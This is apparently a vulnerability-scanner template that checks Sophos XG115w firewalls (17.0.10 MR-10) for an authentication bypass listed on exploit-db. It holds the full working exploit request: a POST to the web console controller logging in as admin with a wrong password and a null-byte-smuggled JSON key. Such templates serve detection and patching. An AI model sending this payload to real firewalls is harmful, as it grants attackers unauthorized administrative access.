expression: r0()
id: sophos-xg115w-firewall-mr-10-authentication
info:
  author: Aryan Chehreghani
  description: "\u6B64\u6F0F\u6D1E\u5141\u8BB8\u653B\u51FB\u8005\u901A\u8FC7\u7ED5\
    \u8FC7\u8EAB\u4EFD\u9A8C\u8BC1\u83B7\u5F97\u5BF9\u9632\u706B\u5899\u7BA1\u7406\
    \u7A7A\u95F4\u7684\u672A\u7ECF\u6388\u6743\u7684\u8BBF\u95EE\u3002"
  name: Sophos XG115w Firewall 17.0.10 MR-10 - Authentication Bypass
  reference:
  - https://www.exploit-db.com/exploits/51006
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'{"redirectionURL":')
      && response.body.bcontains(b'"/webpages/index.jsp"') && response.body.bcontains(b'"status":')
    request:
      body: 'mode=151&json={"username"%3a"admin","password"%3a"somethingnotpassword","languageid"%3a"1","browser"%3a"Chrome_101","accessaction"%3a1,+"mode\u0000ef"%3a716}&__RequestType=ajax&t=1653896534066

        '
      headers:
        Accept: text/plain, */*; q=0.01
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.5
        Cookie: JSESSIONID=c893loesu9tnlvkq53hy1jiq103
        Origin: '{{hosturl}}'
        Referer: '{{hosturl}}/webconsole/webpages/login.jsp'
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Te: trailers
        X-Requested-With: XMLHttpRequest
      method: POST
      path: /webconsole/Controller
set:
  hosturl: request.url
